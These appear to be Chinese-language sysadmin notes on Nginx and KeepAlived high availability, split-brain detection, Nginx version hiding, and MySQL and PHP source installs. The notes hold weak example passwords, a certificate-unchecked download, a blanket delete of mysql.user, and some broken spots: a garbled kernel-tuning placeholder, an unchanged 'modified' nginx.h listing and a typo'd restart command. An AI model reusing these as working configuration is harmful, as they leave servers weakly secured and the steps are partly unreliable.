# ======================================================================
# 在web01及web02上进行设置
# 配置文件片段 - web01之httpd.conf
#<VirtualHost *:80>   # 需要注释掉
#    ServerAdmin ldczz@163.com
#    DocumentRoot /var/www/bbs
#    ServerName bbs.lavenliu.com
#    ErrorLog logs/bbs-error_log
#    CustomLog logs/bbs-access_log common
#</VirtualHost>

<VirtualHost *:80>
    ServerAdmin ldczz@163.com
    DocumentRoot /var/www/www
    ServerName www.lavenliu.com
    ErrorLog logs/www-error_log
    CustomLog logs/www-access_log combined
</VirtualHost>
# cd /var/www/www
web01# echo iPhone > test.html
web02# echo Android > test.html
# service httpd restart
# 分别使用iPhone和Android手机进行测试
# 在web01或web02上观察http的访问日志（目前作者只有iPhone手机）
"192.168.0.103" - - [21/Feb/2016:22:12:31 +0800] "GET /test.html HTTP/1.0" 200 8 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4"
"192.168.0.103" - - [21/Feb/2016:22:13:05 +0800] "GET /test.html HTTP/1.0" 200 7 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4"
"192.168.0.103" - - [21/Feb/2016:22:13:07 +0800] "GET /test.html HTTP/1.0" 200 7 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4"
	  #+END_SRC
*** Nginx+KeepAlived高可用
**** KeepAlived高可用与Nginx整合实战
	 配置Nginx负载均衡器高可用的步骤：
	 1. 两台机器都安装配置Nginx负载均衡器
	 2. 两台机器都安装配置KeepAlived软件
	 3. 选择提供服务的VIP，在keepalived.conf中进行配置
	 4. 确保两台负载均衡器的Nginx都处于启动状态，监听本机的IP地址即可
	 5. 当主Nginx负载均衡器宕机时，备用负载均衡器接管VIP，使得用户请求
        自身的Nginx代理服务
    
	 上述过程存在一个隐患：
	 #+BEGIN_EXAMPLE
	 主服务器没宕机，而Nginx负载均衡服务本身不提供服务了，这样的情况下，
	 KeepAlived服务不会切换VIP。相当于VIP地址还存在于主Nginx负载均衡器
	 上，但Nginx服务已经关闭了。所以，无法对外提供服务。
	 #+END_EXAMPLE

	 解决方案：
	 #+BEGIN_EXAMPLE
	 最简单的，在Nginx负载均衡所在服务器本地，通过定时任务（守护进程）
	 运行一个脚本，当Nginx进程（或URL）不存在时，停止其KeepAlived服务，
	 强制VIP切换。
[root@lb01 scripts]# cat check_lb.sh
#!/bin/sh
while true
do
	 PNUM=`ps -ef |grep nginx |grep -v grep |wc -l`
	 if [ $PNUM -lt 2 ]; then
	     /etc/init.d/keepalived stop > /dev/null 2>&1
	     killall -9 keepalived > /dev/null 2>&1
	     killall -9 keepalived > /dev/null 2>&1
	 fi
	 sleep 5
done
	 #+END_EXAMPLE

	 在lb01及lb02上分别安装及配置KeepAlived软件，安装及配置参考前面的
	 KeepAlived章节。
	 #+BEGIN_EXAMPLE
# 配置文件片段 - nginx.conf之lb01与lb02
worker_processes  1;
events {
    worker_connections  1024;
}
http {
    include       mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;
    
# regular reverse proxy configure
    upstream web_pool {
        server 192.168.20.152:80 weight=5;
        server 192.168.20.153:80 weight=5;
    }

    server {
        listen       80;
        server_name  www.lavenliu.com;
        
        location / {
            root   html;
            index  index.html index.htm;
            
            proxy_pass http://web_pool;
            include proxy.conf;
        }

        error_page   500 502 503 504  /50x.html;
        location = /50x.html {
            root   html;
        }
    }
}
# 设置完毕，检查nginx.conf配置语法，并重新加载配置文件
# /application/nginx/sbin/nginx -t
# /application/nginx/sbin/nginx -s reload
	 #+END_EXAMPLE

	 修改Windows客户端的hosts文件，如下，
	 #+BEGIN_SRC sh
# vi /c/Windows/System32/drivers/etc/hosts
192.168.20.250 www.lavenliu.com bbs.lavenliu.com
# 然后，使用curl进行测试
for i in {1..10} ; do curl www.lavenliu.com ; done
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0    437      0 --:--:-- --:--:-- --:--:--  7000www153 # 注意这里的内容

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0    437      0 --:--:-- --:--:-- --:--:--  7000www152 # 注意这里的内容

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0      7      0  0:00:01 --:--:--  0:00:01  7000www153 # 注意这里的内容

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0      7      0  0:00:01 --:--:--  0:00:01  7000www152 # 注意这里的内容

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0      7      0  0:00:01 --:--:--  0:00:01  7000www153

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0      7      0  0:00:01 --:--:--  0:00:01  7000www152

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0      7      0  0:00:01 --:--:--  0:00:01  7000www153

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0      7      0  0:00:01 --:--:--  0:00:01  7000www152

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0      7      0  0:00:01 --:--:--  0:00:01  7000www153

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0      7      0  0:00:01 --:--:--  0:00:01  7000www152
	 #+END_SRC

	 现在关闭lb01的操作系统，观察客户端是否可以正常访问。
	 #+BEGIN_SRC sh
lb01# poweroff
lb02# ip a |grep 192.168.20.250
    inet 192.168.20.250/24 scope global secondary eth1
windowns$ for i in {1..10} ; do curl www.lavenliu.com ; done
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0    437      0 --:--:-- --:--:-- --:--:--  7000www152 # 注意这里的内容

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0    466      0 --:--:-- --:--:-- --:--:--  7000www153 # 注意这里的内容

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0      7      0  0:00:01 --:--:--  0:00:01  7000www152

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0    437      0 --:--:-- --:--:-- --:--:--  7000www153

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0    466      0 --:--:-- --:--:-- --:--:--  7000www152

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0      7      0  0:00:01 --:--:--  0:00:01  7000www153

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0    437      0 --:--:-- --:--:-- --:--:--   437www152

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0    466      0 --:--:-- --:--:-- --:--:--   466www153

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0      7      0  0:00:01 --:--:--  0:00:01  7000www152

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     7  100     7    0     0      7      0  0:00:01 --:--:--  0:00:01  7000www153
	 #+END_SRC
***** Nginx负载均衡监测后端节点健康状态
	  1. 插件
	  2. 脚本实现
		 #+BEGIN_EXAMPLE
		 自己动手实现
		 #+END_EXAMPLE
**** KeepAlived高可用问题及企业解决方案实战
	 主服务器没宕机，而Nginx负载均衡服务本身不提供服务了，这样的情况下，
	 KeepAlived服务不会切换VIP。相当于VIP地址还存在于主Nginx负载均衡器
	 上，但Nginx服务已经关闭了。所以，无法对外提供服务。

	 KeepAlived实现服务器级别的接管。Nginx宕掉KeepAlived不会接管。

	 解决方案：
	 #+BEGIN_EXAMPLE
	 最简单的，在Nginx负载均衡所在服务器本地，通过定时任务（守护进程）
	 运行一个脚本，当Nginx进程（或URL）不存在时，停止其KeepAlived服务，
	 强制VIP切换。
[root@lb01 scripts]# cat check_lb.sh
#!/bin/sh
while true
do
	 PNUM=`ps -ef |grep nginx |grep -v grep |wc -l`
	 if [ $PNUM -lt 2 ]; then
	     /etc/init.d/keepalived stop > /dev/null 2>&1
	     killall -9 keepalived > /dev/null 2>&1
	     killall -9 keepalived > /dev/null 2>&1
	 fi
	 sleep 5
done
	 #+END_EXAMPLE
**** KeepAlived高可用脑裂问题解决及开发脚本检查脑裂方案实战
	 如果在备节点上，可以ping的通主，并且备节点上还有VIP，则说明脑裂了。
	 检测脑裂的脚本，
	 #+BEGIN_SRC sh
# cat /home/lavenliu/scripts/check_brain_split.sh
#!/bin/sh

while true
do
    ping -c2 -W3 192.168.20.150 &> /dev/null
    if [ $? -eq 0 -a `ip a |grep 192.168.20.250|wc -l` -eq 1 ]; then
        echo "HA is brain split. Dangerous!"
    else
        echo "HA is OK."
    fi
    sleep 5
done
	 #+END_SRC
	 
	 具体演示步骤，
	 #+BEGIN_SRC sh
lb02# sh check_brain_split.sh
HA is OK.
HA is brain split. Dangerous!
HA is brain split. Dangerous!
HA is brain split. Dangerous!
HA is brain split. Dangerous!
HA is brain split. Dangerous!
HA is OK.
HA is OK.
lb02# /etc/init.d/iptables start
lb01# /etc/init.d/iptables start
lb01# ip a |grep 192.168.20.250
    inet 192.168.20.250/24 scope global secondary eth1
lb02# ip a |grep 192.168.20.250
    inet 192.168.20.250/24 scope global secondary eth1
	 #+END_SRC
**** KeepAlived高可用日志说明及实战配置日志路径
	 KeepAlived的日志信息是输出在/var/log/messages日志文件里的。可以进
	 行配置，改变其日志的输出位置。

	 修改/etc/sysconfig/keepalived配置文件，
	 #+BEGIN_SRC
cat /etc/sysconfig/keepalived 
# Options for keepalived. See `keepalived --help' output and keepalived(8) and
# keepalived.conf(5) man pages for a list of all options. Here are the most
# common ones :
#
# --vrrp               -P    Only run with VRRP subsystem.
# --check              -C    Only run with Health-checker subsystem.
# --dont-release-vrrp  -V    Dont remove VRRP VIPs & VROUTEs on daemon stop.
# --dont-release-ipvs  -I    Dont remove IPVS topology on daemon stop.
# --dump-conf          -d    Dump the configuration data.
# --log-detail         -D    Detailed log messages.
# --log-facility       -S    0-7 Set local syslog facility (default=LOG_DAEMON)
#

# KEEPALIVED_OPTIONS="-D" # default line
KEEPALIVED_OPTIONS="-D -d -S 0"
	 #+END_SRC

	 修改rsyslog配置文件，增加内容如下，
	 #+BEGIN_EXAMPLE
tail -n2 /etc/rsyslog.conf
# keepalived                                                                                                                         
local0.*                                                /var/log/keepalived.log
	 #+END_EXAMPLE

	 修改完毕，重启rsyslog服务及KeepAlived服务，
	 #+BEGIN_SRC sh
lb01# service rsyslog restart
lb01# service keepalived resart
lb01# tail /var/log/keepalived.log
Feb 22 04:52:07 lb01 Keepalived_vrrp[5232]: VRRP sockpool: [ifindex(3), proto(112), unicast(0), fd(10,11)]
Feb 22 04:52:07 lb01 Keepalived_healthcheckers[5231]: Configuration is using : 7528 Bytes
Feb 22 04:52:07 lb01 Keepalived_healthcheckers[5231]: Using LinkWatch kernel netlink reflector...
Feb 22 04:52:08 lb01 Keepalived_vrrp[5232]: VRRP_Instance(VI_1) Transition to MASTER STATE
Feb 22 04:52:08 lb01 Keepalived_vrrp[5232]: VRRP_Instance(VI_1) Received lower prio advert, forcing new election
Feb 22 04:52:09 lb01 Keepalived_vrrp[5232]: VRRP_Instance(VI_1) Entering MASTER STATE
Feb 22 04:52:09 lb01 Keepalived_vrrp[5232]: VRRP_Instance(VI_1) setting protocol VIPs.
Feb 22 04:52:09 lb01 Keepalived_vrrp[5232]: VRRP_Instance(VI_1) Sending gratuitous ARPs on eth1 for 192.168.20.250
Feb 22 04:52:09 lb01 Keepalived_healthcheckers[5231]: Netlink reflector reports IP 192.168.20.250 added
Feb 22 04:52:14 lb01 Keepalived_vrrp[5232]: VRRP_Instance(VI_1) Sending gratuitous ARPs on eth1 for 192.168.20.250
lb02# service rsyslog restart
lb02# service keepalived resart
lb02# tail /var/log/keepalived.log
Feb 22 04:54:37 lb02 Keepalived_healthcheckers[4117]: Registering Kernel netlink reflector
Feb 22 04:54:37 lb02 Keepalived_healthcheckers[4117]: Registering Kernel netlink command channel
Feb 22 04:55:17 lb02 Keepalived_vrrp[4118]: Opening file '/etc/keepalived/keepalived.conf'.
Feb 22 04:55:17 lb02 Keepalived_vrrp[4118]: Configuration is using : 63175 Bytes
Feb 22 04:55:17 lb02 Keepalived_vrrp[4118]: Using LinkWatch kernel netlink reflector...
Feb 22 04:55:17 lb02 Keepalived_vrrp[4118]: VRRP_Instance(VI_1) Entering BACKUP STATE
Feb 22 04:55:17 lb02 Keepalived_vrrp[4118]: VRRP sockpool: [ifindex(3), proto(112), unicast(0), fd(10,11)]
Feb 22 04:55:17 lb02 Keepalived_healthcheckers[4117]: Opening file '/etc/keepalived/keepalived.conf'.
Feb 22 04:55:17 lb02 Keepalived_healthcheckers[4117]: Configuration is using : 7534 Bytes
Feb 22 04:55:17 lb02 Keepalived_healthcheckers[4117]: Using LinkWatch kernel netlink reflector...
	 #+END_SRC
**** KeepAlived高可用多实例介绍
	 lb01上的配置，
	 #+BEGIN_EXAMPLE
global_defs {
   notification_email {
     ldc@163.com
   }
   notification_email_from Alexandre.Cassen@firewall.loc
   smtp_server 192.168.200.1
   smtp_connect_timeout 30
   router_id LVS_DEVEL
}

vrrp_instance VI_1 {
    state MASTER
    interface eth1
    virtual_router_id 51
    priority 150
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 1111
    }
    virtual_ipaddress {
        192.168.20.250/24
    }
}

vrrp_instance VI_2 {
    state BACKUP
    interface eth1
    virtual_router_id 52
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 1111
    }
    virtual_ipaddress {
        192.168.20.251/24
    }
}
	 #+END_EXAMPLE

	 lb02上的配置，
	 #+BEGIN_EXAMPLE
global_defs {
   notification_email {
     ldc@163.com
   }
   notification_email_from Alexandre.Cassen@firewall.loc
   smtp_server 192.168.200.1
   smtp_connect_timeout 30
   router_id LVS_DEVEL02
}

vrrp_instance VI_1 {
    state BACKUP
    interface eth1
    virtual_router_id 51
    priority 100
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 1111
    }
    virtual_ipaddress {
        192.168.20.250/24
    }
}

vrrp_instance VI_2 {
    state MASTER
    interface eth1
    virtual_router_id 52
    priority 150
    advert_int 1
    authentication {
        auth_type PASS
        auth_pass 1111
    }
    virtual_ipaddress {
        192.168.20.251/24
    }
}
	 #+END_EXAMPLE

	 在各个负载均衡器上检查VIP，
	 #+BEGIN_SRC sh
lb01# ip a |grep 192.168.20
    inet 192.168.20.150/24 brd 192.168.20.255 scope global eth1
    inet 192.168.20.250/24 scope global secondary eth1
lb02# ip a |grep 192.168.20
    inet 192.168.20.151/24 brd 192.168.20.255 scope global eth1
    inet 192.168.20.251/24 scope global secondary eth1
#
# 停止lb02上的KeepAlived服务
lb02# service keepalived stop
# 再次检查各个负载均衡器上的VIP
lb01# ip a |grep 192.168.20
    inet 192.168.20.150/24 brd 192.168.20.255 scope global eth1
    inet 192.168.20.250/24 scope global secondary eth1
    inet 192.168.20.251/24 scope global secondary eth1
lb02# ip a |grep 192.168.20
    inet 192.168.20.151/24 brd 192.168.20.255 scope global eth1
#
# 停止lb01上的KeepAlived服务
lb01# service keepalived stop
# 再次检查各个负载均衡器上的VIP
lb01# ip a |grep 192.168.20
    inet 192.168.20.150/24 brd 192.168.20.255 scope global eth1
lb02# ip a |grep 192.168.20
    inet 192.168.20.151/24 brd 192.168.20.255 scope global eth1
    inet 192.168.20.250/24 scope global secondary eth1
    inet 192.168.20.251/24 scope global secondary eth1
	 #+END_SRC
**** 代理节点状态检查脚本
	 动手实践。
** Nginx的cache功能
   nginx_cache 

   http://zyan.cc/nginx_cache/
** Nginx优化
   本优化适合apache、nginx和squid等多种应用，特殊业务也可能需要略作调
   整。

   所谓内核优化，主要是在Linux中针对业务服务应用而进行的系统内核参数优
   化，优化并无特殊标准，下面是常见的生产环境Linux内核优化案例，仅供参
   考，
   #+BEGIN_EXAMPLE
net.手机照片里
   #+END_EXAMPLE
*** Nginx基本安全优化
**** 调整参数隐藏Nginx软件版本号信息
	 尽量隐藏或消除WEB服务对访问的用户显示各类敏感信息（例如：web软件
	 名称及版本号等信息），这样恶意的用户就很难猜测他攻击的服务器是否
	 有特定漏洞的软件，或者是否为有对应漏洞的某一特定版本，从而加强web
	 服务的安全性。
	 #+BEGIN_SRC sh
# curl -I 192.168.20.150
# curl -I 192.168.20.150
HTTP/1.1 200 OK
Server: nginx/1.8.0 # 这里暴露了Nginx软件版本号
Date: Mon, 22 Feb 2016 09:18:47 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 7
Connection: keep-alive
Last-Modified: Sun, 21 Feb 2016 19:36:43 GMT
ETag: "22fef-7-52c4cd6060379"
Accept-Ranges: bytes
	 #+END_SRC
	 
	 在Nginx配置文件里增加如下的配置，在http字段里添加，
	 #+BEGIN_SRC sh
http {
	server_tokens off;
}
	 #+END_SRC

	 配置完毕，检查Nginx配置语法，然后reload，
	 #+BEGIN_SRC sh
/application/nginx/sbin/nginx -t
/application/nginx/sbin/nginx -s reload
# 再次使用curl查看
curl -I 192.168.20.150
HTTP/1.1 200 OK
Server: nginx # 版本号已经隐藏了，但还是有nginx的字眼
Date: Mon, 22 Feb 2016 10:27:40 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 7
Connection: keep-alive
Last-Modified: Sun, 21 Feb 2016 19:36:43 GMT
ETag: "22fef-7-52c4cd6060379"
Accept-Ranges: bytes
	 #+END_SRC

	 另外就是修改Nginx的源代码，可以达到彻底修改的目的，源文件在
	 nginx-<version>/src/core/nginx.h文件中，如下，
	 #+BEGIN_SRC sh
# sed -n '13,24p' nginx.h
#define NGINX_VERSION      "1.8.0"
#define NGINX_VER          "nginx/" NGINX_VERSION

#ifdef NGX_BUILD
#define NGINX_VER_BUILD    NGINX_VER " (" NGX_BUILD ")"
#else
#define NGINX_VER_BUILD    NGINX_VER
#endif

#define NGINX_VAR          "NGINX"
#define NGX_OLDPID_EXT     ".oldbin"
# 作如下修改
#define NGINX_VERSION      "1.8.0"
#define NGINX_VER          "nginx/" NGINX_VERSION

#ifdef NGX_BUILD
#define NGINX_VER_BUILD    NGINX_VER " (" NGX_BUILD ")"
#else
#define NGINX_VER_BUILD    NGINX_VER
#endif

#define NGINX_VAR          "NGINX"
#define NGX_OLDPID_EXT     ".oldbin"

# 还要修改http/ngx_http_header_filter_module.c文件的49行，
static char ngx_http_server_string[] = "Server: nginx" CRLF;
static char ngx_http_server_string[] = "Server: ZWS" CRLF;

# 还要修改http/ngx_http_special_response.c的第21到30行
static u_char ngx_http_error_full_tail[] =
"<hr><center>" NGINX_VER "</center>" CRLF # 这里也可做修改
"</body>" CRLF
"</html>" CRLF
;


static u_char ngx_http_error_tail[] =
"<hr><center>lighttp</center>" CRLF # 此行是更改对外展示的Nginx名字为lighttp
"</body>" CRLF
	 #+END_SRC

	 修改完毕，进行编译即可，
	 #+BEGIN_SRC sh
useradd -M -s /sbin/nologin nginx
./configure --user=nginx --group=nginx \
			--prefix=/application/nginx-1.9.1 \
			--with-http_stub_status_module \
			--with-http_ssl_module
make
make install
	 #+END_SRC
**** 更改Nginx服务的默认用户
	 编译时指定用户，如nginx，但要新增nginx用户。如果编译之前没有指定，
	 可以在编译完毕后，修改配置文件也可。
*** 根据参数优化Nginx服务性能
**** 优化Nginx服务的worker进程个数
	 在高并发、高访问量的web服务场景，需要事先启动好更多的Nginx进程以
	 确保快速响应并处理大量并发用户的请求。 
** LNMP
*** MysQL
**** 添加用户
	#+BEGIN_SRC sh
useradd mysql -s /sbin/nologin -M
	#+END_SRC
**** 下载解压软件
	#+BEGIN_SRC sh
tar -xf mysql-5.5.32-linux2.6-x86_64.tar.gz -C /home/lavenliu/tools
mv /home/lavenliu/tools/mysql-5.5.32-linux2.6-x86_64 /application/mysql-5.5.32
ln -s /application/mysql-5.5.32 /application/mysql
	#+END_SRC
**** 初始化数据库
	#+BEGIN_SRC sh
/application/mysql/scripts/mysql_install_db \
--basedir=/application/mysql \
--datadir=/application/mysql/data \
--user=mysql
	#+END_SRC
**** 授权MySQL管理数据库文件
	#+BEGIN_SRC sh
chown -R mysql.mysql /application/mysql/
	#+END_SRC
**** 生成MySQL配置文件
	#+BEGIN_SRC sh
\cp /application/mysql/support-files/my-small.cnf /etc/my.cnf
sed -i 's#/usr/local/mysql#/application/mysql#g' /application/mysql/bin/mysqld_safe
\cp /application/mysql/support-files/mysql.server /etc/init.d/mysqld
chmod +x /etc/init.d/mysqld
sed -i 's#/usr/local/mysql#/application/mysql#g' /etc/init.d/mysqld
/etc/init.d/mysqld start
chkconfig mysqld on
[root@lnmp ~]# lsof -i:3306
COMMAND  PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
mysqld  5621 mysql   10u  IPv4  25591      0t0  TCP *:mysql (LISTEN)
	#+END_SRC
**** 设置及更改密码
	新安装的MySQL是没有密码的，所以接下来设置密码，
	#+BEGIN_SRC sh
mysqladmin -uroot password "123456" # 设置新密码
mysqladmin -uroot -p123456 password "lavenliu" # 修改密码
	#+END_SRC
**** 安全优化
	#+BEGIN_SRC sh
[root@lnmp ~]# mysql -uroot -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 6
Server version: 5.5.32 MySQL Community Server (GPL)

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| test               |
+--------------------+
4 rows in set (0.00 sec)
#
# 删除test库
mysql> drop database test;
Query OK, 0 rows affected (0.01 sec)
#
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)
#
# 删除多余的用户
mysql> select user,host from mysql.user;
+------+-----------+
| user | host      |
+------+-----------+
| root | 127.0.0.1 |
| root | ::1       | # 把此用户删除
|      | lnmp      | # 把此用户删除
| root | lnmp      | # 把此用户删除
|      | localhost | # 把此用户删除
| root | localhost |
+------+-----------+
6 rows in set (0.00 sec)
mysql> drop user ''@'localhost';
Query OK, 0 rows affected (0.00 sec)

mysql> drop user 'root'@'::1';
Query OK, 0 rows affected (0.00 sec)
# 注意，主机名有大写或包含特殊字符，使用drop删除不掉
# 可以使用如下的方式删除，
# delete from mysql.user where user='root' and host='A';
mysql> delete from mysql.user;
mysql> grant all on *.* to 'root'@'localhost' identified by '123456' with grant option;
mysql> flush privileges;
	#+END_SRC
**** mysqldump
	#+BEGIN_SRC sh
mysqldump -uroot -p123456 -B -A -x --events |gzip > /opt/bak_$(date +%F).sql.gz
# -A 备份所有库
# -B 备份多个库，并添加use库名；create database库等功能
# -x 锁表，会影响读写，尽量晚上操作
# gzip 压缩效率高
# 备份指定的库
mysqldump -uroot -p123456 -B wordpress -x |gzip > /opt/bak_$(date +%F).sql.gz
	#+END_SRC
*** PHP
**** PHP服务之FastCGI介绍
***** 什么是CGI
	 CGI全称是“通用网关接口”（Common Gateway Interface），用于HTTP服务
	 器与其它机器上的程序服务通信交流的一种工具，CGI程序必须运行在网路
	 服务器上。

	 传统CGI接口方式的主要缺点是性能较差，因为每次HTTP服务器遇到动态程序时都需要重新启动解析器来执行解析，然后结果被返回给HTTP服务器。
	 这在处理高并发访问时，几乎是不可用的，因此就诞生了FastCGI。另外传统的CGI接口方式安全性也很差，现在已经很少被使用了。
***** 什么是FastCGI
	 FastCGI是一个可伸缩地、高速地在HTTP服务器和动态脚本语言间通信的接
	 口（FastCGI接口在Linux下是socket，这个socket可以是文件socket，也
	 可以是ip socket），主要优点是把动态语言和HTTP服务器分离开来。多数流行的HTTP服务器都支持
	 FastCGI，包括Apache、Nginx和Lighttpd等。

	 同时，FastCGI也被许多脚本语言所支持，比较流行的脚本语言之一为PHP。
	 FastCGI接口采用C/S架构，可以将HTTP服务器和脚本解析服务器分离开来，
	 同时在脚本解析服务器上启动一个或者多个脚本解析守护进程。当HTTP服
	 务器每次遇到动态程序时，可以将其直接交给FastCGI进程来执行，然后将
	 得到的结果返回给浏览器。这种方式可以让HTTP服务器专一的处理静态请
	 求或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高了整
	 个应用系统的性能高。

	 FastCGI的重要特点总结：
	 1. FastCGI是HTTP服务器和动态脚本语言间通信的接口或者工具。
	 2. FastCGI的优点是把动态语言解析和HTTP服务器分离开来。
	 3. Nginx、Apache、Lighttpd以及多数动态语言都支持FastCGI。
	 4. FastCGI接口方式采用C/S架构，分为客户端（HTTP服务器）和服务端（动态语言解析服务器）。
	 5. PHP动态语言服务端可以启动多个FastCGI的守护进程（例如，php-fpm（fcgi process management））。
	 6. http服务器通过（例如：Nginx fastcgi_pass）FastCGI客户端和动态语言FastCGI服务端通信（例如：php-fpm）。

     PHP fastcgi模式的设置说明：
	 #+BEGIN_EXAMPLE
	 php5.3及以上：编译参数 --enable-fpm
	 php5.2: 编译参数 --enable-fastcgi --enable-fpm --enable-cgi
	 php5.2安装可以参考http://blog.zyan.cc/nginx_php_v6
	 #+END_EXAMPLE
**** PHP服务之php基础依赖库安装
	php程序在开发及运行时会调用一些诸如zlib、gd等函数库，因此需要这些
	库事先已安装。检查是否已安装，
	#+BEGIN_SRC sh
rpm -qa zlib-devel libxml2-devel libjpeg-turbo-devel libiconv-devel
zlib-devel-1.2.3-29.el6.x86_64
rpm -qa freetype-devel libpng-devel gd-devel libcurl-devel
libpng-devel-1.2.49-2.el6_7.x86_64
yum install -y libxml2-devel libjpeg-turbo-devel libiconv-devel freetype-devel gd-devel libcurl-devel
	#+END_SRC
**** PHP服务之特殊功能库软件安装
	由于yum源里没有libiconv包，所以进行手工编译安装。
	#+BEGIN_SRC sh
cd /home/lavenliu/tools
wget http://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.14.tar.gz
tar -xf libiconv-1.14.tar.gz
cd libiconv-1.14
./configure --prefix=/usr/local/libiconv
make
make install
	#+END_SRC
	
	然后，还需要安装libmcrypt库，
	#+BEGIN_SRC sh
wget --no-check-certificate https://sourceforge.net/projects/mcrypt/files/Libmcrypt/2.5.8/libmcrypt-2.5.8.tar.gz
tar -xf libmcrypt-2.5.8.tar.gz
cd libmcrypt-2.5.8
./configure
make
make install
# 或者使用yum的方式安装
yum install -y libmcrypt-devel
rpm -qa libmcrypt-devel
libmcrypt-devel-2.5.8-9.el6.x86_64
	#+END_SRC

	还需要再安装一个mhash的加密扩展库。mhash是基于离散数学原理的不可逆
	向的php加密方式扩展库，其在默认情况下不开启。mhash可以用于创建校验
	数值、消息摘要、消息认证码，以及无需原文的关键信息保存（如密码）等。

	mhash为php提供了多种哈希算法，如MD5、SHA1、GOST等。你可以通过
	MHASH_hashname()来查看支持的算法有哪些。

	#+BEGIN_SRC sh
	yum install -y mhash-devel mhash
    rpm -qa mhash-devel mhash
	#+END_SRC
**** 安装PHP服务
     	#+BEGIN_SRC sh
	--with-mysql=mysqlnd # 在没有安装MySQL的情况下使用
	#+END_SRC

	#+BEGIN_SRC sh
./configure --prefix=/application/php-5.3.27 \
--with-mysql=/application/mysql \
--with-iconv-dir=/usr/local/libiconv \
--with-freetype-dir \
--with-jpeg-dir \
--with-png-dir \
--with-zlib \
--with-libxml-dir=/usr \
--enable-xml \
--disable-rpath \
--enable-safe-mode \
--enable-bcmath \
--enable-shmop \
--enable-sysvsem \
--enable-inline-optimization \
--with-curl \
--with-curlwrappers \
--enable-mbregex \
--enable-fpm \
--enable-mbstring \
--with-mcrypt \
--with-gd \
--enable-gd-native-ttf \
--with-openssl \
--with-mhash \
--enable-pcntl \
--enable-sockets \
--with-xmlrpc \
--enable-zip \
--enable-soap \
--enable-short-tags \
--enable-zend-multibyte \
--enable-static \
--with-xsl \
--with-fpm-user=nginx \
--with-fpm-group=nginx \
--enable-ftp
# 编译安装出现了错误提示
# configure: error: xslt-config not found. Please reinstall the libxslt >= 1.1.0 distribution
yum install -y libxslt-devel
make
# make的时候，报错
# /usr/bin/ld: cannot find -lltdl
# make: *** [sapi/fpm/php-fpm] Error 1
yum install libtool-ltdl-devel -y
make install
Installing PHP SAPI module:       fpm
Installing PHP CLI binary:        /application/php5.3.27/bin/
Installing PHP CLI man page:      /application/php5.3.27/man/man1/
Installing PHP FPM binary:        /application/php5.3.27/sbin/
